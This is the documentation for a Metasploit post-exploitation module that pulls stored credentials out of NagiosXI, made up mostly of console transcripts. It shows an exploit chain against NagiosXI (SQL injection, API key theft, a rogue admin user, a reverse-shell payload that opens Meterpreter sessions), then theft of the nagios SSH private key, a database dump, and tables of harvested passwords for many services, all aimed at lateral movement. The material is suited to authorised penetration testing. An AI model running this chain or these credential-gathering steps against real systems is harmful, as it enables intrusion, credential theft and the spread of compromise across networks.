## Description
NagiosXI may store credentials of the hosts it monitors. This module extracts these credentials, creating opportunities for lateral movement.
## Verification Steps

  1. Start msfconsole
  2. Get a session via `exploits/linux/http/nagios_xi.rb`
  3. Do: `post/linux/gather/enum_nagios_xi.rb`
  4. Do: `set session <session>`
  5. Do: `run`
  6. Do: `creds`
  7. Do: `cat <nagiosxi_raw_db_dump>`

## Options

  **SESSION**

  Which session to use, which can be viewed with `sessions -l`

## Scenarios

  Run NagiosXI exploit

```
msf > use exploit/linux/http/nagios_xi
msf exploit(linux/http/nagios_xi) > set lhost 10.30.1.28 
lhost => 10.30.1.28
msf exploit(linux/http/nagios_xi) > set rhost 10.20.1.173
rhost => 10.20.1.173
msf exploit(linux/http/nagios_xi) > 
msf exploit(linux/http/nagios_xi) > run
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 10.30.1.28:4444 
msf exploit(linux/http/nagios_xi) > [*] STEP 0: Get Nagios XI version string.
[+] STEP 0: Found Nagios XI version: 5.4.12
[*] STEP 1: Setting Nagios XI DB user to root.
[*] STEP 1: Received a 302 Response. That's good!
[*] STEP 2: Exploiting SQLi to extract user API keys.
[*] STEP 2: Received a 302 Response. That's good!
[*] Found 11 unique api keys
[*] tuiWeCnN64nXtkJcQE2u4u9durfmqjqdQM94EP8JSuWG8W8YAqMTXU6rFF75eBil
[*] qt7AJRfXYknvoq0jqBD44SJQmpPvDSb3miD5p83nMJdqqd3T4Fd7uVdTEiJebTAA
[*] I5W4tvAbrc0biW802ZTTqeA3rOYhHIrlMnIfceJHqZR2dfiuecnHJXZaLeLoWc3Y
[*] BAY6svNUp08tXINXPRXHiK44MYAOSr4Jh25MR8GA9O3mM6EBeRuvRRCDQooYSLHa
[*] MtuaHUupZ9dpto5ddTCMigGVQR0nTv7F2E5YOCn4LTtuhBKOLDA3ScfYjvldkr8l
[*] BkEJZtQfNApvRIvbg77sLGjvTrQBmBcXb6WqC3YmCnbJl0UF7hnReJmnqsXQj94N
[*] WYhkN5umcmJUuIMQOIoo74eRvOoV9TWlRdIUBdgNSfXGWJt0nboNeFVMKDHSsTdD
[*] 2nTEUjDQ9iY3NrVaUu2NYB6TZ0WWtcquCjpNF2D4kRnnCCBt6SAkpGdJWqFJF5eu
[*] O4WSLrSpu7iK4iEVfgnDhPB2bdkONs4BPgKA0CfOZBv3SpX7ZF0AKRRb4bYRH2IM
[*] 5KWtYXRbnEmfnm4Qfiapj4lG6M3X948u4l0jC8tZ2aepvBv4SYsc288oabliuNPC
[*] Ord0hrk9Ter9gbirugtvrotkWoJVIlcN6J4maoP3FgrcL4Gvj945QBoNfnYdMqZR
[*] STEP 3: Using API Keys to add an administrative user...
[*] STEP 3: trying to add admin user with key tuiWeCnN64nXtkJcQE2u4u9durfmqjqdQM94EP8JSuWG8W8YAqMTXU6rFF75eBil
[+] Added user:yScojGUCgAPilfqh password:fqQCBzaGXpZHFvoJ userid:30
[*] STEP 4.1: Authenticate as user yScojGUCgAPilfqh with password fqQCBzaGXpZHFvoJ
[*] STEP 4.1: Get NSP and nagiosxi for login..
[*] STEP 4.1: login_nsp 8f370fa23e68e6704abdfd49b7d114cf610704f8466d1164c45718b8008d6871 
[*] STEP 4.1: login_nagiosxi vfa3qfp8kihitivaepnrn4n350
[*] STEP 4.2: Authenticating...
[*] STEP 4.2: authed_nagiosxi mk0j50na6009ab0sa1t8e9t166
[*] STEP 5.1: executing payload
[*] STEP 5.2: removing scripts from disc
[*] Command Stager progress - 100.00% done (701/701 bytes)
[*] STEP 6.1: Setting Nagios XI DB user to nagiosql.
[*] STEP 6.1: Received a 302 Response. That's good!
[*] STEP 6.2: deleting admin
[*] Sending stage (857352 bytes) to 10.20.1.173
[*] Meterpreter session 4 opened (10.30.1.28:4444 -> 10.20.1.173:57856) at 2018-04-26 18:31:51 -0400
[*] Sending stage (857352 bytes) to 10.20.1.173
[*] Meterpreter session 5 opened (10.30.1.28:4444 -> 10.20.1.173:57858) at 2018-04-26 18:31:51 -0400

msf exploit(linux/http/nagios_xi) > 
  ```

  Run linux/gather/enum_nagios_xi
  ```
msf exploit(linux/http/nagios_xi) > use post/linux/gather/enum_nagios_xi 
msf post(linux/gather/enum_nagios_xi) > set session 4
session => 4
msf post(linux/gather/enum_nagios_xi) > run

[*] Attempting to grab Nagios SSH key
[*] 10.20.1.173:80 - Downloading /home/nagios/.ssh/id_rsa
[+] SSH key found!
[*] Nagios SSH key stored in /root/.msf4/loot/20180426183506_default_10.20.1.173_nagios_ssh_priv__025011.txt
[*] Attempting to dump Nagios DB
[*] 10.20.1.173:80 - Downloading /tmp/yYdBpcDv
[+] Nagios DB dump successful
[*] Raw Nagios DB dump /root/.msf4/loot/20180426183521_default_10.20.1.173_nagiosxi_raw_db__491781.txt
[*] Look through the DB dump manually. There could be some good loot we didn't parse out.
[*] Run 'creds' to see credentials loaded into the MSF DB
[*] Post module execution completed
  ```


  View parsed out credentials stored in the MSF DB
  ```
  msf post(linux/gather/enum_nagios_xi) > creds
  Credentials
  ===========
  
  host         origin       service                public                                 private                                          realm        private_type
  ----         ------       -------                ------                                 -------                                          -----        ------------
  10.20.1.4    10.20.1.173  161/udp (SNMP)         verypublic                                                                                           Blank password
  10.20.1.10   10.20.1.173  389/tcp (LDAP)         cn=bort,cn=users,dc=fruitsnacks,dc=co  ##123BLAHBLAH~~                                               Password
  10.20.1.10   10.20.1.173  135/tcp (WMI)          homer                                  LISA-NEEDS-BRACES                                             Password
  10.20.1.172  10.20.1.173  22/tcp (SSH)           nagios                                 76:95:a6:af:e9:c8:1b:6b:3e:ea:3d:f4:b0:cc:84:fc               SSH key 
  10.20.1.173  10.20.1.173  3306/tcp (MySQL)       root                                   nagiosxi                                                      Password
  10.20.1.175  10.20.1.173  22/tcp (SSH)           nagios                                 76:95:a6:af:e9:c8:1b:6b:3e:ea:3d:f4:b0:cc:84:fc               SSH key 
  10.20.1.191  10.20.1.173  1433/tcp (MSSQL)       app_user                               t8Y4RNqKknRyX4A8x5Gm                                          Password
  10.20.1.197  10.20.1.173  21/tcp (FTP)           ftp_user                               agoodpassword                                                 Password
  10.20.1.197  10.20.1.173  135/tcp (WMI)          homer                                  _GETDUFF3D_                                      fruitsnacks  Password
  10.20.1.198  10.20.1.173  21/tcp (FTP)           bort                                   1BARTSIMPSONS                                                 Password
  10.20.1.198  10.20.1.173  135/tcp (WMI)          user                                   agoodpassowrd                                                 Password
  10.20.1.201  10.20.1.173  5432/tcp (PostgreSQL)  root                                   y8EZqAVDS8VH96gaqEk5                                          Password
  
  msf post(linux/gather/enum_nagios_xi) > 
  ```
  
  Check the raw DB dump store in loot for creds we might have missed
  ```
  root@kali:~# cat /root/.msf4/loot/20180426183521_default_10.20.1.173_nagiosxi_raw_db__491781.txt
  "1","10.0.0.1",""
  "25","10.20.1.198","bort!1BARTSIMPSONS!21"
  "25","10.20.1.197","ftp_user!agoodpassword!21"
  "27","127.0.0.1",""
  "30","127.0.0.1","20%!10%!/"
  "31","127.0.0.1","5.0,4.0,3.0!10.0,6.0,4.0"
  "33","127.0.0.1","400!500!RSZDT"
  "34","127.0.0.1","20!10"
  "35","127.0.0.1","20!50"
  "47","127.0.0.1","100.0,20%!500.0,60%"
  "54","127.0.0.1",""
  "59","10.20.1.172","-C %22/usr/local/nagios/libexec/check_users -w 5 -c 10%22"
  "59","10.20.1.172","-C %22/usr/local/nagios/libexec/check_disk /%22"
  "59","10.20.1.172","-C %22/usr/local/nagios/libexec/check_procs -w 150 -c 170%22"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --lockwait --warning 2000 --critical 3000"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --lockwaits --warning 20 --critical 30"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --pagelooks --warning 10 --critical 20"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --pagereads --warning 20 --critical 30"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --pagesplits --warning 20 --critical 30"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --pagewrites --warning 20 --critical 30"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --readahead --warning 40 --critical 50"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --stolenpages --warning 500 --critical 700"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --targetpages --warning 70000 --critical 90000"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --locktimeouts --warning 20 --critical 30"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --lockrequests --warning 20 --critical 30"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --lazywrites --warning 20 --critical 30"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --freepages --warning 10 --critical 20"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --deadlocks --warning 20 --critical 30"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --checkpoints --warning 20 --critical 30"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --time2connect --warning 1 --critical 5"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --databasepages --warning 300 --critical 600"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --averagewait --warning 20 --critical 30"
  "66","10.20.1.191","-U 'app_user' -P 't8Y4RNqKknRyX4A8x5Gm' -p 1433 --bufferhitratio --warning 90: --critical 95:"
  "67","10.20.1.173","--hostname=10.20.1.173 --port=3306 --username=root --password=%22nagiosxi%22 --database=information_schema --mode uptime --warning 10: --critical 5:"
  "67","10.20.1.173","--hostname=10.20.1.173 --port=3306 --username=root --password=%22nagiosxi%22 --database=information_schema --mode tablecache-hitrate --warning 99: --critical 95:"
  "67","10.20.1.173","--hostname=10.20.1.173 --port=3306 --username=root --password=%22nagiosxi%22 --database=information_schema --mode threadcache-hitrate --warning 90: --critical 80:"
  "67","10.20.1.173","--hostname=10.20.1.173 --port=3306 --username=root --password=%22nagiosxi%22 --database=information_schema --mode slow-queries --warning 0.1 --critical 1"
  "67","10.20.1.173","--hostname=10.20.1.173 --port=3306 --username=root --password=%22nagiosxi%22 --database=information_schema --mode threads-connected --warning 10 --critical 20"
  "67","10.20.1.173","--hostname=10.20.1.173 --port=3306 --username=root --password=%22nagiosxi%22 --database=information_schema --mode qcache-hitrate --warning 90: --critical 80:"
  "67","10.20.1.173","--hostname=10.20.1.173 --port=3306 --username=root --password=%22nagiosxi%22 --database=information_schema --mode keycache-hitrate --warning 99: --critical 95:"
  "67","10.20.1.173","--hostname=10.20.1.173 --port=3306 --username=root --password=%22nagiosxi%22 --database=information_schema --mode log-waits --warning 1 --critical 10"
  "67","10.20.1.173","--hostname=10.20.1.173 --port=3306 --username=root --password=%22nagiosxi%22 --database=information_schema --mode long-running-procs --warning 10 --critical 20"
  "67","10.20.1.173","--hostname=10.20.1.173 --port=3306 --username=root --password=%22nagiosxi%22 --database=information_schema --mode connection-time --warning 1 --critical 5"
  "67","10.20.1.173","--hostname=10.20.1.173 --port=3306 --username=root --password=%22nagiosxi%22 --database=information_schema --mode index-usage --warning 90: --critical 80:"
  "67","10.20.1.173","--hostname=10.20.1.173 --port=3306 --username=root --password=%22nagiosxi%22 --database=information_schema --mode bufferpool-hitrate --warning 99: --critical 95:"
  "70","10.20.1.198","-t 'asdfasdf' -P 5693 -M 'processes' -q 'name=calc' -w 60 -c 100"
  "70","10.20.1.198","-t 'asdfasdf' -P 5693 -M memory/swap -u Gi -w 50 -c 80"
  "70","10.20.1.198","-t 'asdfasdf' -P 5693 -M 'interface/Local Area Connection/bytes_recv' -d -u M -w 10 -c 100"
  "70","10.20.1.198","-t 'asdfasdf' -P 5693 -M 'interface/Local Area Connection/bytes_sent' -d -u M -w 10 -c 100"
  "70","10.20.1.198","-t 'asdfasdf' -P 5693 -M 'disk/logical/C:|/used_percent' -w 70 -c 90"
  "76","10.20.1.201","-H 10.20.1.201 --port=5432 --dbuser=root --dbname=postgres --dbpass=%22y8EZqAVDS8VH96gaqEk5%22 --action=relation_size --warning=50MB --critical=100MB"
  "76","10.20.1.201","-H 10.20.1.201 --port=5432 --dbuser=root --dbname=postgres --dbpass=%22y8EZqAVDS8VH96gaqEk5%22 --action=connection"
  "76","10.20.1.201","-H 10.20.1.201 --port=5432 --dbuser=root --dbname=postgres --dbpass=%22y8EZqAVDS8VH96gaqEk5%22 --action=sequence --warning=30% --critical=10%"
  "76","10.20.1.201","-H 10.20.1.201 --port=5432 --dbuser=root --dbname=postgres --dbpass=%22y8EZqAVDS8VH96gaqEk5%22 --action=database_size --warning=500MB --critical=1GB"
  "80","10.20.1.198"," -p 21"
  "80","10.20.1.197"," -p 21"
  "85","10.20.1.4","verypublic!9!-v 2 -p 161"
  "85","10.20.1.4","verypublic!99!-v 2 -p 161"
  "85","10.20.1.4","verypublic!8!-v 2 -p 161"
  "85","10.20.1.4","verypublic!7!-v 2 -p 161"
  "85","10.20.1.4","verypublic!6!-v 2 -p 161"
  "85","10.20.1.4","verypublic!5!-v 2 -p 161"
  "85","10.20.1.4","verypublic!51!-v 2 -p 161"
  "85","10.20.1.4","verypublic!4!-v 2 -p 161"
  "85","10.20.1.4","verypublic!3!-v 2 -p 161"
  "85","10.20.1.4","verypublic!24!-v 2 -p 161"
  "85","10.20.1.4","verypublic!23!-v 2 -p 161"
  "85","10.20.1.4","verypublic!22!-v 2 -p 161"
  "85","10.20.1.4","verypublic!20!-v 2 -p 161"
  "85","10.20.1.4","verypublic!21!-v 2 -p 161"
  "85","10.20.1.4","verypublic!19!-v 2 -p 161"
  "85","10.20.1.4","verypublic!2!-v 2 -p 161"
  "85","10.20.1.4","verypublic!16!-v 2 -p 161"
  "85","10.20.1.4","verypublic!17!-v 2 -p 161"
  "85","10.20.1.4","verypublic!18!-v 2 -p 161"
  "85","10.20.1.4","verypublic!15!-v 2 -p 161"
  "85","10.20.1.4","verypublic!148!-v 2 -p 161"
  "85","10.20.1.4","verypublic!14!-v 2 -p 161"
  "85","10.20.1.4","verypublic!13!-v 2 -p 161"
  "85","10.20.1.4","verypublic!128!-v 2 -p 161"
  "85","10.20.1.4","verypublic!1!-v 2 -p 161"
  "88","10.20.1.10","-b %22dc=fruitsnacks,dc=co%22 -D %22cn=bort,cn=users,dc=fruitsnacks,dc=co%22 -P %22##123BLAHBLAH~~%22 -2"
  "92","10.20.1.191","asdfasdf!MEMUSE!-w 80 -c 90"
  "92","10.20.1.191","asdfasdf!UPTIME"
  "92","10.20.1.191","asdfasdf!CPULOAD!-l 5,80,90"
  "92","10.20.1.191","asdfasdf!USEDDISKSPACE!-l C -w 80 -c 95"
  "92","10.20.1.191","asdfasdf!PROCSTATE!-l explorer.exe -d SHOWALL"
  "93","10.20.1.198","3000.0!80%!5000.0!100%"
  "93","10.20.1.197","3000.0!80%!5000.0!100%"
  "93","10.20.1.191","3000.0!80%!5000.0!100%"
  "93","10.20.1.10","3000.0!80%!5000.0!100%"
  "93","10.20.1.172","3000.0!80%!5000.0!100%"
  "93","10.20.1.4","3000.0!80%!5000.0!100%"
  "96","10.50.1.4"," -o sysUpTime.0 -C verypublic -P 2c"
  "96","10.50.1.4"," -o ifOperStatus.1 -C verypublic -P 2c -m RFC1213-MIB -r %221%22"
  "96","10.50.1.4"," -o .1.3.6.1.4.1.2.3.51.1.2.1.5.1.0 -C verypublic -P 2c -l %22Ambient Temp%22 -u %22Deg. Celsius%22 -w 29 -c 35"
  "106","127.0.0.1","npcd!!!!!!"
  "106","127.0.0.1","ntpd!!!!!!"
  "106","127.0.0.1","mysqld!!!!!!"
  "106","127.0.0.1","ndo2db!!!!!!"
  "106","127.0.0.1","crond!!!!!!"
  "106","127.0.0.1","httpd!!!!!!"
  "110","10.20.1.198","'user'!'agoodpassword'!checkpage!-w '80' -c '90'"
  "110","10.20.1.198","'user'!'agoodpassword'!checkmem!-s physical -w '80' -c '90'"
  "110","10.20.1.198","'user'!'agoodpassword'!checkdrivesize!-a 'C': -w '80' -c '95'"
  "110","10.20.1.198","'user'!'agoodpassword'!checkcpu!-w '80' -c '90'"
  "110","10.20.1.197","'fruitsnacks/homer'!'_GETDUFF3D_'!checkcpu!-w '80' -c '90'"
  "110","10.20.1.197","'fruitsnacks/homer'!'_GETDUFF3D_'!checkdrivesize!-a 'C': -w '80' -c '95'"
  "110","10.20.1.197","'fruitsnacks/homer'!'_GETDUFF3D_'!checkmem!-s physical -w '80' -c '90'"
  "110","10.20.1.197","'fruitsnacks/homer'!'_GETDUFF3D_'!checkpage!-w '80' -c '90'"
  "110","10.20.1.10","'homer'!'LISA-NEEDS-BRACES'!checkprocess!-s Commandline -a 'cmd.exe' -c _ItemCount=1:"
  "110","10.20.1.10","'homer'!'LISA-NEEDS-BRACES'!checkpage!-w '80' -c '90'"
  "110","10.20.1.10","'homer'!'LISA-NEEDS-BRACES'!checkdrivesize!-a 'C': -w '80' -c '95'"
  "110","10.20.1.10","'homer'!'LISA-NEEDS-BRACES'!checkmem!-s physical -w '80' -c '90'"
  "110","10.20.1.10","'homer'!'LISA-NEEDS-BRACES'!checkservice!-a 'ADWS' -c _Total=1: -c 0"
  "110","10.20.1.10","'homer'!'LISA-NEEDS-BRACES'!checkservice!-a 'AeLookupSvc' -c _Total=1: -c 0"

  ```
